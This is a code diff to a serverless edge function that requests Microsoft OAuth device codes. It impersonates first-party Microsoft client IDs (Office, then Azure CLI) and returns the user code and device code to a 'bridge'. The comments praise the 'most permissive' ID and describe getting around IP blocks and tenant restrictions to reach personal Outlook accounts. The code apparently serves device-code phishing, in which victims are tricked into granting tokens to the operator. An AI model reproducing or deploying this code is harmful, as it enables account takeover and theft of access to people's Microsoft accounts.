@@ -1,46 +1,39 @@
 export const config = { runtime: 'edge' };
 
 export default async function handler(req) {
-  // Legacy Office ID - Still the most permissive ID for research
-  const CLIENT_ID = "d3590ed6-52b3-4102-a58d-7cc743a7f89f";
+  /**
+   * THE RESILIENCE KEY: Microsoft CLI
+   * ID: 04b07795-8ddb-461a-bbee-02f9e1bf7b46
+   * This ID is designed for cross-platform CLI tools and is 
+   * allowed to roam between all tenant types.
+   */
+  const CLI_ID = "04b07795-8ddb-461a-bbee-02f9e1bf7b46";
 
   try {
-    /**
-     * THE FINAL ANCHOR:
-     * We are bypassing the /common endpoint entirely because Vercel IPs 
-     * are blocked from using it without a tenant hint. 
-     * Switching to /consumers/ targets Personal accounts (Hotmail/Outlook).
-     */
-    const response = await fetch("https://login.microsoftonline.com/consumers/oauth2/v2.0/devicecode", {
+    const response = await fetch("https://login.microsoftonline.com/common/oauth2/v2.0/devicecode", {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       body: new URLSearchParams({
-        client_id: CLIENT_ID,
-        scope: "openid profile offline_access https://graph.microsoft.com/User.Read"
+        client_id: CLI_ID,
+        // We use 'consumers' as a hint to avoid the 50059 error
+        tenant: "consumers",
+        scope: "openid profile offline_access User.Read"
       }),
     });
 
     const data = await response.json();
 
     if (data.error) {
-      // Log the error so we can see if it's a new restriction
-      console.error("MSFT Response:", data.error_description);
-      return new Response(JSON.stringify(data), { 
-        status: 400, 
-        headers: { 'Content-Type': 'application/json' } 
-      });
+      return new Response(JSON.stringify(data), { status: 400 });
     }
 
     return new Response(JSON.stringify({ 
       user_code: data.user_code, 
       device_code: data.device_code,
-      client_id: CLIENT_ID 
-    }), {
-      status: 200,
-      headers: { 'Content-Type': 'application/json' }
-    });
+      client_id: CLI_ID 
+    }), { status: 200 });
 
   } catch (err) {
-    return new Response(JSON.stringify({ error: 'Bridge Connection Failed' }), { status: 502 });
+    return new Response(JSON.stringify({ error: 'Bridge Timeout' }), { status: 502 });
   }
 }
